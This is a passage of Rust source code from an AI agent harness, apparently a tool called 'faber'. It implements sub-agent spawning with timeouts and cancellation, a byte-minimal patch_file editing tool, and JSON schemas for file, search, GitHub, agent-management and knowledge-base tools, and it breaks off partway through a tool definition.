    sub_status_bar.set_agent_color(
        &agent_name_for_status,
        agent_ansi_code(&agent_name_for_status),
    );

    let runs = sa_ctx.runs.clone();
    let run_id = runs.start(&agent_name, &parent_agent);
    let (cancel_tx, cancel_rx) = mpsc::channel();
    let stop_reason = Arc::new(Mutex::new(None));
    let running = sa_ctx.running_subagents.clone();
    running.lock().unwrap_or_else(|e| e.into_inner()).insert(
        agent_name.clone(),
        RunningSubAgent {
            cancel: cancel_tx,
            stop_reason: stop_reason.clone(),
        },
    );
    if let Some(timeout) = params.timeout_seconds {
        let running = running.clone();
        let name = agent_name.clone();
        std::thread::spawn(move || {
            let deadline = std::time::Instant::now() + Duration::from_secs(timeout);
            while std::time::Instant::now() < deadline {
                std::thread::sleep(Duration::from_millis(100));
                if !running
                    .lock()
                    .unwrap_or_else(|e| e.into_inner())
                    .contains_key(&name)
                {
                    return; // finished in time
                }
            }
            stop_sub_agent(&running, &name, &format!("timed out after {}s", timeout));
        });
    }
    let max_requests = params.max_requests;

    let session_id_for_sub = sa_ctx.session_id.clone();
    let mcp_manager = ctx.mcp.as_ref().map(|m| m.manager().clone());
    // The sub-agent gets the same machinery, so it can spawn its own -
    // which start from its settings and tools.
    let extra_for_sub: Arc<dyn std::any::Any + Send + Sync> = Arc::new(SubAgentContext {
        opts: agent_opts.clone(),
        tools: tools.clone(),
        ..sa_ctx.clone()
    });
    let agent_name_for_ctx = agent_name.clone();
    let context_window = agent_config.context_window.or(ctx.context_window);
    let session_usage = sa_ctx.session_usage.clone();
    std::thread::spawn(move || {
        struct SubAgentGuard {
            status_bar: Arc<status_bar::StatusBar>,
            counter: Arc<std::sync::atomic::AtomicUsize>,
            running: RunningSubAgents,
            db: Arc<dyn DbBackend>,
            name: String,
            session_id: String,
        }
        impl Drop for SubAgentGuard {
            fn drop(&mut self) {
                self.running
                    .lock()
                    .unwrap_or_else(|e| e.into_inner())
                    .remove(&self.name);
                self.status_bar.clear_agent_status(&self.name);
                self.counter
                    .fetch_sub(1, std::sync::atomic::Ordering::Relaxed);
                let _ = self.db.release_agent(&self.name, &self.session_id);
            }
        }
        let _guard = SubAgentGuard {
            status_bar: sub_status_bar,
            counter: active_counter,
            running,
            db: db.clone(),
            name: agent_name_for_status,
            session_id: session_id_for_sub,
        };

        let mut sub_ctx = ToolContext::new(|_: &str| {});
        sub_ctx.db = Some(db.clone());
        sub_ctx.unsafe_tools = sub_unsafe;
        sub_ctx.cwd = sub_cwd;
        sub_ctx.task_id = task_id;
        sub_ctx.agent_name = Some(agent_name_for_ctx);
        sub_ctx.mcp = agent_mcp(mcp_manager.as_ref(), &agent_config);
        sub_ctx.context_window = context_window;
        sub_ctx.extra = Some(extra_for_sub);
        sub_ctx.max_requests = max_requests;
        let slot = Arc::new(Mutex::new(None));
        sub_ctx.result_slot = Some(slot.clone());
        sub_ctx.result_schema = result_schema.clone();
        let activity = ActivityRecorder::new(db.clone(), &agent_name);
        activity.set("thinking");
        let events = Some(EventLog::new(db.clone(), &agent_name, task_id));
        if let Some(events) = &events {
            events.emit(AgentEvent::Input {
                text: prompt.clone(),
            });
        }
        // Streamed, though nothing is shown: its progress keeps the status
        // bar and `faber agents` current, and its events are recorded.
        let mode = || {
            let activity = activity.clone();
            let status_bar = sub_status_bar_for_progress.clone();
            let name = agent_name.clone();
            recorded_mode(
                ResponseMode::Streaming {
                    stream_handler: Box::new(|_: &str| Ok(())),
                    reasoning_handler: Box::new(|_: &str| Ok(())),
                    progress_handler: Box::new(move |progress: &ProgressInfo| {
                        activity.follow(&progress.status);
                        if let StatusUpdate::ToolStart { name: tool, .. } = &progress.status {
                            status_bar.set_agent_status(&name, &format!("Running {}", tool), false);
                        }
                        Ok(())
                    }),
                },
                &events,
            )
        };
        let transcript_start = messages.clone();
        let cancel = Some(Arc::new(Mutex::new(cancel_rx)));
        // Its tools stop with it: a command, a fan-out, a wait.
        sub_ctx.interrupt = cancel.clone();
        let result = run_reporting(messages, &slot, result_schema.as_ref(), |messages| {
            run_collecting_sub_agents(&runs, &agent_name, &cancel, &events, messages, |messages| {
                post_request_with_mode(
                    messages,
                    &tools,
                    &agent_opts,
                    mode(),
                    &sub_ctx,
                    cancel.clone(),
                )
            })
        });
        // Kept, with the agent, until `faber gc`: `faber agents show` reads it.
        let transcript = match &result {
            Ok(response) => response.history.clone(),
            Err(_) => transcript_start,
        };
        let values: Vec<serde_json::Value> = transcript
            .iter()
            .filter_map(|m| serde_json::to_value(m).ok())
            .collect();
        let _ = db.save_agent_messages(&agent_name, &values);
        if let Some(usage) = result.as_ref().ok().and_then(|r| r.turn_usage.as_ref()) {
            session_usage
                .lock()
                .unwrap_or_else(|e| e.into_inner())
                .record(usage);
        }
        let response_text = match result {
            Err(e) if e.downcast_ref::<InterruptedError>().is_some() => format!(
                "Stopped: {}",
                stop_reason
                    .lock()
                    .unwrap_or_else(|e| e.into_inner())
                    .clone()
                    .unwrap_or_else(|| "cancelled".to_string())
            ),
            result => match work_outcome(result, &slot) {
                Ok(outcome) if outcome.succeeded => outcome.text(),
                Ok(outcome) => format!("Failed: {}", outcome.text()),
                Err(e) => format!("Error: {}", e),
            },
        };
        let first_line = first_line(&response_text, 80);
        record_turn_end(
            &events,
            &db::TaskOutcome {
                succeeded: !["Stopped: ", "Error: ", "Failed: "]
                    .iter()
                    .any(|p| response_text.starts_with(p)),
                exit_code: None,
                result: response_text.clone(),
            },
        );
        activity.set(
            &if let Some(reason) = first_line.strip_prefix("Stopped: ") {
                format!("stopped: {}", reason)
            } else if let Some(error) = first_line
                .strip_prefix("Error: ")
                .or_else(|| first_line.strip_prefix("Failed: "))
            {
                format!("failed: {}", error)
            } else {
                format!("finished: {}", first_line)
            },
        );
        runs.finish(run_id, &response_text);
        let notification = serde_json::json!({
            "type": "subagent_result",
            "agent": agent_name,
            "run": run_id,
            "prompt": prompt,
            "response": response_text,
        });
        let _ = db.send_notification(&agent_name, &parent_agent, &notification.to_string());
    });

    let result = serde_json::json!({
        "status": "spawned",
        "agent": params.name,
        "prompt": params.prompt,
        "hint": "use agent_wait to wait for its result",
    });
    Ok(result.to_string())
}

/// entrypoint for the patch_file tool
///
/// Applies a batch of search-and-replace edits to an existing file.  The file
/// is opened once (read-write) through `Root`, every edit is applied in
/// memory and validated before anything is written, and only the bytes that
/// actually changed are written back, without truncating the file first.
/// How many lines of unchanged context to include above and below each
/// edit's preview in the `patch_file` result.
const PATCH_PREVIEW_CONTEXT_LINES: usize = 2;

/// Returns the 1-based line number of `text` containing byte offset `pos`
/// (or the last line, for a `pos` at or past the end).
fn line_of(lines: &[&str], pos: usize) -> usize {
    let mut end = 0;
    for (i, line) in lines.iter().enumerate() {
        end += line.len();
        if pos < end {
            return i + 1;
        }
    }
    lines.len().max(1)
}

/// Renders a few lines of numbered context around `text[byte_start..byte_end]`,
/// so a caller can see the effect of a change without reading the whole file.
/// Returns the 1-based (start_line, end_line) of the changed span itself,
/// plus the rendered snippet (which includes the context lines around it).
fn line_context(text: &str, byte_start: usize, byte_end: usize) -> (usize, usize, String) {
    use std::fmt::Write;

    // Each element keeps its own trailing newline, so line numbers can be
    // computed directly from cumulative byte lengths.
    let lines: Vec<&str> = text.split_inclusive('\n').collect();

    let start_line = line_of(&lines, byte_start);
    let end_line = if byte_end > byte_start {
        line_of(&lines, byte_end - 1)
    } else {
        start_line
    };

    let from = start_line
        .saturating_sub(PATCH_PREVIEW_CONTEXT_LINES)
        .max(1);
    let to = (end_line + PATCH_PREVIEW_CONTEXT_LINES).min(lines.len());

    let mut snippet = String::new();
    for (offset, line) in lines[from.saturating_sub(1)..to].iter().enumerate() {
        let _ = write!(snippet, "{:>5}  {}", from + offset, line);
        if !line.ends_with('\n') {
            snippet.push('\n');
        }
    }

    (start_line, end_line, snippet)
}

/// The byte range of lines `start..=end` (1-based) of `text`, each with its
/// line break.
fn line_range_bytes(text: &str, start: usize, end: usize) -> Result<(usize, usize), String> {
    let lines: Vec<&str> = text.split_inclusive('\n').collect();
    if start == 0 {
        return Err("start_line is 1-based, cannot be 0".to_string());
    }
    if end < start {
        return Err(format!(
            "end_line ({}) must be >= start_line ({})",
            end, start
        ));
    }
    if end > lines.len() {
        return Err(format!(
            "end_line {} is past the end of the file ({} lines)",
            end,
            lines.len()
        ));
    }
    let first: usize = lines[..start - 1].iter().map(|l| l.len()).sum();
    let len: usize = lines[start - 1..end].iter().map(|l| l.len()).sum();
    Ok((first, first + len))
}

fn tool_patch_file(params_str: &String, ctx: &ToolContext) -> Result<String, Box<dyn Error>> {
    use serde::Serialize;
    use std::os::unix::fs::FileExt;

    /// One edit: replace `old_content` (search and replace), or lines
    /// `start_line`..=`end_line` (as the file is after the edits before
    /// this one), with `new_content`.
    #[derive(Deserialize)]
    struct Edit {
        #[serde(default)]
        old_content: Option<String>,
        #[serde(default)]
        start_line: Option<usize>,
        #[serde(default)]
        end_line: Option<usize>,
        new_content: String,
        #[serde(default)]
        replace_all: bool,
    }

    #[derive(Deserialize)]
    struct Params {
        path: String,
        edits: Vec<Edit>,
    }

    #[derive(Serialize)]
    struct EditPreview {
        /// 1-based line where this edit's replacement text starts.
        start_line: usize,
        /// 1-based line where this edit's replacement text ends.
        end_line: usize,
        /// A few lines of numbered context around the change.
        snippet: String,
    }

    #[derive(Serialize)]
    struct PatchFileResult {
        path: String,
        edits_applied: usize,
        replacements: usize,
        bytes_before: usize,
        bytes_after: usize,
        bytes_written: usize,
        message: String,
        /// One entry per edit, in order, showing where it landed in the
        /// final file - lets the caller confirm the change without a
        /// separate read_file call.
        previews: Vec<EditPreview>,
    }

    let mut params: Params = serde_json::from_str::<Params>(params_str)?;
    params.path = ctx.tool_path(&params.path);

    debug!(
        "patch_file received params: path='{}', edits={}",
        params.path,
        params.edits.len()
    );

    if params.edits.is_empty() {
        return Err("edits must contain at least one edit".into());
    }

    let root = Root::open(ctx.cwd())?;
    let file = root
        .open_subpath(&params.path, OpenFlags::O_RDWR)
        .map_err(|e| {
            format!(
                "File '{}' must exist and be writable: {}",
                params.path,
                describe_error(&e)
            )
        })?;
    check_readable(&file, &params.path)?;

    let mut original = Vec::new();
    (&file).read_to_end(&mut original)?;
    let mut text = String::from_utf8(original.clone())
        .map_err(|_| format!("File '{}' contains invalid UTF-8", params.path))?;
    // Text edits only apply where old_content still matches, wherever the
    // file has changed; line numbers mean nothing in a file that changed
    // since it was read.
    if params.edits.iter().any(|e| e.start_line.is_some()) {
        ctx.check_file_unchanged(&params.path, &original)?;
    }

    // Byte span of each edit's replacement text, tracked through the loop so
    // it stays correct in the final `text` even as later edits shift things
    // around; used to build the previews below.
    let mut edit_spans: Vec<(usize, usize)> = Vec::with_capacity(params.edits.len());

    let mut replacements = 0;
    for (i, edit) in params.edits.iter().enumerate() {
        let n = i + 1;
        // The byte range this edit replaces, and with what.
        let (first, old_end, new_content) =
            match (&edit.old_content, edit.start_line, edit.end_line) {
                (Some(_), Some(_), _) | (Some(_), _, Some(_)) => {
                    return Err(format!(
                        "edit {}: give either old_content or start_line/end_line, not both",
                        n
                    )
                    .into());
                }
                (None, Some(start), Some(end)) => {
                    let (first, old_end) = line_range_bytes(&text, start, end)
                        .map_err(|e| format!("edit {}: {}", n, e))?;
                    // Replacing whole lines: keep the last one's line break
                    // unless the new text brings its own.
                    let mut new_content = edit.new_content.clone();
                    if text[first..old_end].ends_with('\n')
                        && !new_content.is_empty()
                        && !new_content.ends_with('\n')
                    {
                        new_content.push('\n');
                    }
                    (first, old_end, new_content)
                }
                (None, _, _) => {
                    return Err(format!(
                        "edit {}: give old_content, or both start_line and end_line",
                        n
                    )
                    .into());
                }
                (Some(old_content), None, None) => {
                    if old_content.is_empty() {
                        return Err(format!("edit {}: old_content must not be empty", n).into());
                    }
                    if *old_content == edit.new_content {
                        return Err(format!(
                            "edit {}: old_content and new_content are identical",
                            n
                        )
                        .into());
                    }
                    let first = text.find(old_content.as_str()).ok_or_else(|| {
                        format!("edit {}: old_content not found in '{}'", n, params.path)
                    })?;
                    (first, first + old_content.len(), edit.new_content.clone())
                }
            };

        if let (true, Some(old_content)) = (edit.replace_all, &edit.old_content) {
            replacements += text.matches(old_content.as_str()).count();
            text = text.replace(old_content.as_str(), &edit.new_content);
            // Multiple occurrences move independently, so exact tracking
            // isn't practical here; show the first one as representative.
            edit_spans.push(
                text.find(edit.new_content.as_str())
                    .map(|pos| (pos, pos + edit.new_content.len()))
                    .unwrap_or((first, first)),
            );
        } else {
            if let Some(old_content) = &edit.old_content {
                // Look for a second match starting after the first
                // character of the first one, so overlapping matches count
                // as ambiguous too.
                let skip = first + old_content.chars().next().map_or(1, char::len_utf8);
                if text[skip..].contains(old_content.as_str()) {
                    return Err(format!(
                        "edit {}: old_content matches multiple times in '{}'. Set replace_all=true or provide more context to make it unique",
                        n, params.path
                    )
                    .into());
                }
            }

            let delta = new_content.len() as isize - (old_end - first) as isize;
            for (s, e) in edit_spans.iter_mut() {
                if *s >= old_end {
                    *s = (*s as isize + delta) as usize;
                    *e = (*e as isize + delta) as usize;
                }
            }
            edit_spans.push((first, first + new_content.len()));

            text.replace_range(first..old_end, &new_content);
            replacements += 1;
        }
    }

    let new_bytes = text.as_bytes();

    // Only rewrite the region between the first and the last differing byte.
    let prefix = original
        .iter()
        .zip(new_bytes)
        .take_while(|(a, b)| a == b)
        .count();
    let suffix = if original.len() == new_bytes.len() {
        original[prefix..]
            .iter()
            .rev()
            .zip(new_bytes[prefix..].iter().rev())
            .take_while(|(a, b)| a == b)
            .count()
    } else {
        0
    };
    let end = new_bytes.len() - suffix;

    if prefix < end {
        file.write_all_at(&new_bytes[prefix..end], prefix as u64)?;
    }
    if new_bytes.len() != original.len() {
        file.set_len(new_bytes.len() as u64)?;
    }
    ctx.note_file_version(&params.path, new_bytes);

    let previews: Vec<EditPreview> = edit_spans
        .iter()
        .map(|&(span_start, span_end)| {
            let (start_line, end_line, snippet) = line_context(&text, span_start, span_end);
            EditPreview {
                start_line,
                end_line,
                snippet,
            }
        })
        .collect();

    let result = PatchFileResult {
        path: params.path.clone(),
        edits_applied: params.edits.len(),
        replacements,
        bytes_before: original.len(),
        bytes_after: new_bytes.len(),
        bytes_written: end.saturating_sub(prefix),
        message: format!("File '{}' patched successfully", params.path),
        previews,
    };

    ctx.println(&format!("\u{1f4dd} {}", result.message));
    ctx.println(&format!("   Path: {}", result.path));
    ctx.println(&format!(
        "   Edits: {} ({} replacements)",
        result.edits_applied, result.replacements
    ));
    ctx.println(&format!(
        "   Bytes: {} -> {} ({} written)",
        result.bytes_before, result.bytes_after, result.bytes_written
    ));

    if let Ok(old_str) = String::from_utf8(original) {
        show_diff(ctx, &old_str, &text, &params.path);
    }

    Ok(serde_json::to_string(&result)?)
}

fn initialize_tools(unsafe_tools: bool, allowed: Option<&[String]>) -> ToolsCollection {
    let mut tools: ToolsCollection = ToolsCollection::new();

    append_tool(
        &mut tools,
        "github_issue".to_string(),
        tool_github_issue,
        r#"
        {
            "type": "function",
            "function": {
                "name": "github_issue",
                "description": "Read GitHub issues: one issue by number (with comments: true, its comments too), or without a number, the issues updated in the last few days.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "repo": {"type": "string", "description": "owner/repo, e.g. containers/crun"},
                        "number": {"type": "integer", "description": "The issue's number"},
                        "comments": {"type": "boolean", "description": "With number: also get its comments"},
                        "days": {"type": "integer", "description": "Without number: how many days back to list (default 7)"}
                    },
                    "required": ["repo"],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "github_pull_request".to_string(),
        tool_github_pull_request,
        r#"
        {
            "type": "function",
            "function": {
                "name": "github_pull_request",
                "description": "Read GitHub pull requests: one by number (with patch: true, its diff instead), or without a number, the pull requests updated in the last few days.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "repo": {"type": "string", "description": "owner/repo, e.g. containers/crun"},
                        "number": {"type": "integer", "description": "The pull request's number"},
                        "patch": {"type": "boolean", "description": "With number: get its diff instead of its details"},
                        "days": {"type": "integer", "description": "Without number: how many days back to list (default 7)"}
                    },
                    "required": ["repo"],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "read_file".to_string(),
        tool_read_file,
        r#"
        {
            "type": "function",
            "function": {
                "name": "read_file",
                "description": "Get the content of a file stored in the repository. Returns JSON with 'content' field containing file content on success, or 'error' field with error message on failure. 'total_lines' is always included on success. For a large file, pass start_line and end_line to read only that range instead of the whole file.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": {
                            "type": "string",
                            "description": "path of the file under the repository, e.g. src/main.rs"
                        },
                        "start_line": {
                            "type": "integer",
                            "description": "1-based line number to start reading from (inclusive); alone, reads to the end. Omit both to read the whole file."
                        },
                        "end_line": {
                            "type": "integer",
                            "description": "1-based line number to stop reading at (inclusive); alone, reads from the start."
                        }
                    },
                    "required": [
                        "path"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "delete_path".to_string(),
        tool_delete_path,
        r#"
        {
            "type": "function",
            "function": {
                "name": "delete_path",
                "description": "Delete a file or a directory under the current directory.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": {
                            "type": "string",
                            "description": "path of the file under the current directory"
                        }
                    },
                    "required": [
                        "path"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "write_file".to_string(),
        tool_write_file,
        r#"
        {
            "type": "function",
            "function": {
                "name": "write_file",
                "description": "Create a file, or replace a file's whole content. To replace an existing file you must have read it first, and it's refused if it changed since (someone else edited it) - read it again then. To change part of an existing file, use patch_file instead.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": {
                            "type": "string",
                            "description": "path of the file under the repository, e.g. src/main.rs"
                        },
                        "content": {
                            "type": "string",
                            "description": "the file's full content"
                        },
                        "mode": {
                            "type": "string",
                            "description": "file permissions in octal, e.g. '0755' for an executable (default '0644')"
                        }
                    },
                    "required": [
                        "path",
                        "content"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "patch_file".to_string(),
        tool_patch_file,
        r#"
        {
            "type": "function",
            "function": {
                "name": "patch_file",
                "description": "Change part of an existing file: one or more edits, each replacing either exact text (old_content) or a range of lines (start_line..end_line) with new_content. The edits are applied in order (each one sees the result of the previous ones, line numbers included), validated together, and either all applied or none, and only the changed bytes are rewritten. Each old_content must match exactly once unless replace_all is true. The result includes a 'previews' entry per edit with a few lines of numbered context around where it landed, so there's usually no need to call read_file afterward just to confirm the change.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "path": {
                            "type": "string",
                            "description": "path of the existing file under the repository, e.g. src/main.rs"
                        },
                        "edits": {
                            "type": "array",
                            "description": "the edits to apply, in order",
                            "minItems": 1,
                            "items": {
                                "type": "object",
                                "properties": {
                                    "old_content": {
                                        "type": "string",
                                        "description": "exact, non-empty text to find in the file"
                                    },
                                    "start_line": {
                                        "type": "integer",
                                        "description": "instead of old_content: the first line to replace (1-based)"
                                    },
                                    "end_line": {
                                        "type": "integer",
                                        "description": "with start_line: the last line to replace (inclusive)"
                                    },
                                    "new_content": {
                                        "type": "string",
                                        "description": "the replacement text (may be empty to delete)"
                                    },
                                    "replace_all": {
                                        "type": "boolean",
                                        "description": "if true, replace every occurrence of old_content. Defaults to false (requires a unique match)."
                                    }
                                },
                                "required": [
                                    "new_content"
                                ],
                                "additionalProperties": false
                            }
                        }
                    },
                    "required": [
                        "path",
                        "edits"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "glob".to_string(),
        tool_glob,
        r#"
        {
            "type": "function",
            "function": {
                "name": "glob",
                "description": "Find files matching a glob pattern in the current directory. Supports patterns like '*.rs', '**/*.txt', 'src/**/*.rs', etc. Cannot access parent directories or absolute paths for security.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "pattern": {
                            "type": "string",
                            "description": "The glob pattern to match files against (e.g., '*.rs', '**/*.txt', 'src/**/*.rs'). Cannot contain '../' or start with '/' for security."
                        }
                    },
                    "required": [
                        "pattern"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "grep".to_string(),
        if unsafe_tools {
            tool_grep_unsandboxed
        } else {
            tool_grep
        },
        r#"
        {
            "type": "function",
            "function": {
                "name": "grep",
                "description": "Search file contents with a regular expression (ripgrep syntax, e.g. `fn \\w+_tool|tool_\\w+`), in the directory you work in unless given paths. Files ignored by .gitignore, hidden files and binary files are skipped. Returns matching lines as `path:line:text`, sorted by path; results beyond max_results are cut off with a note.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "pattern": {
                            "type": "string",
                            "description": "The regular expression to search for (a literal string if fixed_strings is true)."
                        },
                        "path": {
                            "type": "string",
                            "description": "File or directory to search; relative paths are to the directory you work in. Defaults to all of it."
                        },
                        "paths": {
                            "type": "array",
                            "items": {"type": "string"},
                            "description": "Several files or directories to search at once."
                        },
                        "count": {
                            "type": "boolean",
                            "description": "Only how many matching lines each file has, as `path:count`."
                        },
                        "multiline": {
                            "type": "boolean",
                            "description": "Let the pattern match across lines (e.g. `struct Foo \\{[^}]*bar`)."
                        },
                        "glob": {
                            "type": "string",
                            "description": "Only search files whose name matches this glob, e.g. \"*.rs\"."
                        },
                        "case_insensitive": {
                            "type": "boolean",
                            "description": "Match regardless of case."
                        },
                        "fixed_strings": {
                            "type": "boolean",
                            "description": "Treat pattern as a literal string, not a regular expression."
                        },
                        "context_lines": {
                            "type": "integer",
                            "description": "Also show this many lines before and after each match (at most 10)."
                        },
                        "files_only": {
                            "type": "boolean",
                            "description": "Only list the paths of files that contain a match."
                        },
                        "include_ignored": {
                            "type": "boolean",
                            "description": "Also search hidden and .gitignore'd files (e.g. build output)."
                        },
                        "max_results": {
                            "type": "integer",
                            "description": "Maximum number of output lines to return (default 200, at most 2000)."
                        }
                    },
                    "required": [
                        "pattern"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "agent_create".to_string(),
        tool_agent_create,
        r#"
        {
            "type": "function",
            "function": {
                "name": "agent_create",
                "description": "Create a new named agent in the database for organizing tasks and storing data.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "name": {
                            "type": "string",
                            "description": "Unique name for the agent"
                        },
                        "description": {
                            "type": "string",
                            "description": "Optional description of the agent's purpose"
                        },
                        "profile": {
                            "type": "string",
                            "description": "Make it from this profile: it gets a copy of the profile's settings"
                        },
                        "unsafe_tools": {
                            "type": "boolean",
                            "description": "Give it the unsafe tools (unsandboxed commands, web access) or not. Default: as you. Only an agent that has them can give them"
                        },
                        "cwd": {
                            "type": "string",
                            "description": "Where it works (an existing directory). Default: where you do. Only an agent with the unsafe tools can choose another"
                        }
                    },
                    "required": [
                        "name"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "agent_delete".to_string(),
        tool_agent_delete,
        r#"
        {
            "type": "function",
            "function": {
                "name": "agent_delete",
                "description": "Delete an agent and all its associated data from the database.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "name": {
                            "type": "string",
                            "description": "Name of the agent to delete"
                        }
                    },
                    "required": [
                        "name"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "agent_list".to_string(),
        tool_agent_list,
        r#"
        {
            "type": "function",
            "function": {
                "name": "agent_list",
                "description": "List all agents in the database.",
                "parameters": {
                    "type": "object",
                    "properties": {},
                    "required": [],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "agent_get".to_string(),
        tool_agent_get,
        r#"
        {
            "type": "function",
            "function": {
                "name": "agent_get",
                "description": "Get details of a specific agent by name.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "name": {
                            "type": "string",
                            "description": "Name of the agent to retrieve"
                        }
                    },
                    "required": [
                        "name"
                    ],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    let (agent_configure, endpoint_param, who_may) = if unsafe_tools {
        (
            tool_agent_configure as ToolCallback,
            r#""endpoint": {"type": "string", "description": "API endpoint for this agent"},"#,
            "",
        )
    } else {
        (
            tool_agent_configure_safe as ToolCallback,
            "",
            " Only agents you made (and theirs) can be changed.",
        )
    };
    append_tool(
        &mut tools,
        "agent_configure".to_string(),
        agent_configure,
        format!(
            r#"
        {{
            "type": "function",
            "function": {{
                "name": "agent_configure",
                "description": "Set an agent's own model, {endpoint_word}system prompt, used from its next turn on - or replace all its settings with a copy of a profile's. An empty string clears that setting, so the agent goes back to the default. agent_get shows the current configuration.{who_may}",
                "parameters": {{
                    "type": "object",
                    "properties": {{
                        "agent": {{"type": "string", "description": "Name of the agent"}},
                        "profile": {{"type": "string", "description": "Replace its settings with this profile's (other fields given are then set over them)"}},
                        "model": {{"type": "string", "description": "Model to use for this agent"}},
                        {endpoint_param}
                        "system_prompt": {{"type": "string", "description": "System prompt for this agent"}},
                        "unsafe_tools": {{"type": "boolean", "description": "Give it the unsafe tools (unsandboxed commands, web access), or take them away. Only an agent that has them can do either, or change an agent that has them"}},
                        "cwd": {{"type": "string", "description": "Set the directory it works in (an existing directory). Only an agent with the unsafe tools can"}}
                    }},
                    "required": ["agent"],
                    "additionalProperties": false
                }}
            }}
        }}
"#,
            endpoint_word = if unsafe_tools { "API endpoint or " } else { "" },
        ),
    );

    append_tool(
        &mut tools,
        "lsp".to_string(),
        if unsafe_tools {
            tool_lsp_unsandboxed
        } else {
            tool_lsp
        },
        r#"
        {
            "type": "function",
            "function": {
                "name": "lsp",
                "description": "Ask the language server for the file's language (rust-analyzer, clangd, pyright/pylsp, gopls or typescript-language-server, whichever is installed) about code in the current directory's project. Actions: definition (where a symbol is defined), references (every use of a symbol), hover (its type and documentation), symbols (outline of a file: its functions, types, etc. with line ranges - cheaper than reading the file), workspace_symbols (find symbols by name across the project), diagnostics (compiler errors and warnings for a file). Point at a symbol with its line and the symbol's text on that line.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "action": {
                            "type": "string",
                            "enum": ["definition", "references", "hover", "symbols", "workspace_symbols", "diagnostics"]
                        },
                        "path": {
                            "type": "string",
                            "description": "The file, relative to the current directory. For workspace_symbols, any file in the language to search."
                        },
                        "line": {
                            "type": "integer",
                            "description": "1-based line of the symbol (definition, references, hover)."
                        },
                        "symbol": {
                            "type": "string",
                            "description": "The symbol's text as it appears on that line, e.g. a function name (definition, references, hover)."
                        },
                        "column": {
                            "type": "integer",
                            "description": "1-based column, only if the symbol text is ambiguous on the line."
                        },
                        "query": {
                            "type": "string",
                            "description": "Symbol name or part of it (workspace_symbols)."
                        }
                    },
                    "required": ["action", "path"],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "kb_search".to_string(),
        tool_kb_search,
        r#"
        {
            "type": "function",
            "function": {
                "name": "kb_search",
                "description": "Search the knowledge base: notes that you, other agents and the user saved about this project and how to work on it - how to build and deploy, decisions and why, conventions, gotchas, the user's preferences. Search it before asking the user something they may already have told an agent, and before re-investigating something that may already be known. Results are ranked by relevance, each with a snippet where the [matching words] are; read a note in full with kb_read.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "query": {"type": "string", "description": "What to look for, in words, e.g. \"deploy staging\""},
                        "tag": {"type": "string", "description": "Only notes with this tag"},
                        "limit": {"type": "integer", "description": "Most results to return (default 8)"}
                    },
                    "required": ["query"],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "kb_read".to_string(),
        tool_kb_read,
        r#"
        {
            "type": "function",
            "function": {
                "name": "kb_read",
                "description": "Read a knowledge base note in full, by id (as kb_search and kb_list show it) or by title.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "id": {"type": "integer"},
                        "title": {"type": "string"}
                    },
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "kb_list".to_string(),
        tool_kb_list,
        r#"
        {
            "type": "function",
            "function": {
                "name": "kb_list",
                "description": "List knowledge base notes, most recently updated first, optionally only those with a tag.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "tag": {"type": "string"},
                        "limit": {"type": "integer", "description": "Most notes to list (default 20)"}
                    },
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "kb_write".to_string(),
        tool_kb_write,
        r#"
        {
            "type": "function",
            "function": {
                "name": "kb_write",
                "description": "Save something worth knowing beyond this conversation to the knowledge base: facts about the project, decisions and the reasons for them, how-tos, conventions, gotchas, the user's preferences. Keep one topic per note under a clear title. Writing a note whose title already exists replaces it, so search first and update an existing note (with its full new text) rather than adding a near-duplicate. Notes are shared with every agent unless private. You also see the private notes of the agent that started you, if any, and of the one that started it, and so on.",
                "parameters": {
                    "type": "object",
                    "properties": {
                        "title": {"type": "string", "description": "A short, specific title, e.g. \"Deploying to staging\""},
                        "body": {"type": "string", "description": "The note's full text (Markdown)"},
                        "tags": {"type": "array", "items": {"type": "string"}, "description": "A few tags to group notes by, e.g. [\"ops\", \"deploy\"]"},
                        "private": {"type": "boolean", "description": "Only you and the sub-agents you start (and theirs) will see it - not the agent that started you, nor anyone else"}
                    },
                    "required": ["title", "body"],
                    "additionalProperties": false
                }
            }
        }
"#
        .to_string(),
    );

    append_tool(
        &mut tools,
        "kb_delete".to_string(),
        tool_kb_delete,
        r#"
        {
            "type": "function",
            "function": {
                "name": "kb_delete",
